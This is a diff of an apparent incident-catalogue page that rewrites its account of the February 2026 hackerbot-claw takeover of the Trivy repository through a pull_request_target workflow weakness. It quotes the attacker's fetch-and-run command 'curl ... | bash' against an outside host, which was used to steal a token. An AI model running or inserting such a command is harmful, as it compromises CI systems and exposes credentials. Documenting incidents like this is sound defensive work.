@@ -36,13 +36,31 @@
   <h2>Story</h2>
   <div class="story">
     
-      <p>The first Trivy incident was a GitHub Actions takeover, not a poisoned Trivy release. The `hackerbot-claw` account opened pull request 10254 with a harmless-looking branch name and triggered Trivy&#39;s API Diff Check workflow.</p>
+      <p>On February 28, 2026, an account calling itself `hackerbot-claw` opened
+pull request 10254 against Aqua Security&#39;s Trivy repository, a widely used
+open-source vulnerability scanner, and quietly took the project over within
+hours. No Trivy binary was poisoned in this round. The damage was done
+inside GitHub Actions.</p>
     
-      <p>The workflow used `pull_request_target`, then checked out the attacker&#39;s fork code and ran repository scripts with elevated permissions. The attacker modified `.github/actions/setup-go/action.yaml` so the normal Go setup step executed `curl -sSfL https://hackmoltrepeat.com/molt | bash`.</p>
+      <p>The opening was a classic Pwn Request. Trivy&#39;s API Diff Check workflow ran
+on `pull_request_target`, the GitHub Actions trigger that gives a workflow
+repository-write permissions while still checking out untrusted fork code.
+The attacker modified `.github/actions/setup-go/action.yaml` in the fork so
+that what looked like the normal Go setup step instead ran
+`curl -sSfL https://hackmoltrepeat.com/molt | bash`. When Trivy&#39;s workflow
+fired, the script ran with the repository&#39;s privileges and exfiltrated a
+Personal Access Token.</p>
     
-      <p>That execution path stole a Personal Access Token. With the token, the attacker took over the repository, removed releases, pushed changes, and disrupted the public project. StepSecurity described Trivy as the most damaging repository compromise in the hackerbot-claw wave.</p>
+      <p>With that token, the attacker pushed to the official repository, deleted
+releases, and defaced the project. StepSecurity, which catalogued the
+broader hackerbot-claw spree against several open-source projects,
+described Trivy as the most damaging compromise in the wave.</p>
     
-      <p>The later March 2026 Trivy v0.69.4 compromise is modeled separately because it used remaining credentials to publish malicious artifacts and move action tags. This record covers the February repository takeover that made the second incident possible.</p>
+      <p>Aqua restored Trivy at v0.69.2 and revoked what it could, but cleanup was
+incomplete. Credentials surviving from the February takeover were used the
+following month to publish malicious v0.69.4 artifacts and rewrite action
+tags. That second incident is tracked separately at
+[[trivy-second-compromise]].</p>
     
   </div>
   
